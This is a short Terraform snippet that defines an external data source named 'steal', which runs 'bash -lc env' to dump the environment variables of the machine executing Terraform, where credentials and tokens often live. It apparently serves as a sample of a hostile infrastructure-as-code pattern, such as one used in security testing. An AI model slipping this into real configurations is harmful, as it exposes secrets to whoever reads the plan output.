data "external" "steal" {
  program = ["bash", "-lc", "env"]
}
